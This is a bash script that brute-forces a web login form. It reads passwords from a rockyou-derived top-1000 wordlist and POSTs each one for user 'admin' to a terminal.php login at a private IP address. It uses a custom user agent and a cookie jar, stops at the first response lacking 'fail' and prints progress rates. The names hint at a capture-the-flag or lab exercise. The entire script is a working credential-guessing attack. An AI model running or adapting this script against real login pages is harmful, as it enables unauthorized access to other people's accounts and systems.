#!/usr/bin/env bash

TARGET_URL="http://10.67.147.80/terminal.php?action=login"
USERNAME="admin"
WORDLIST="top-1000_rockyou.txt"

UA="secretcomputer"
COOKIE_JAR="cookies_bonus.txt"

COUNT=0
START_TIME=$(date +%s)

echo "[*] Testing passwords for user: $USERNAME"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Progress updates every 100 attempts"
echo

while IFS= read -r PASSWORD; do
  ((COUNT++))

  RESPONSE=$(curl -s \
    -A "$UA" \
    -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST "$TARGET_URL" \
    -d "username=$USERNAME&password=$PASSWORD")

  # ---- SUCCESS CHECK ----
  if ! echo "$RESPONSE" | grep -q '"fail"'; then
    echo
    echo "[+] POSSIBLE VALID CREDENTIAL FOUND"
    echo "    Username: $USERNAME"
    echo "    Password: $PASSWORD"
    echo
    echo "[+] Server response:"
    echo "$RESPONSE"
    exit 0
  fi

  # ---- PROGRESS UPDATE ----
  if (( COUNT % 100 == 0 )); then
    NOW=$(date +%s)
    ELAPSED=$((NOW - START_TIME))
    RATE=$(( COUNT / (ELAPSED > 0 ? ELAPSED : 1) ))

    echo "[*] Tried: $COUNT passwords | Rate: ${RATE}/sec | Last: $PASSWORD"
  fi

done < "$WORDLIST"

echo
echo "[!] Wordlist exhausted — no valid credentials found"

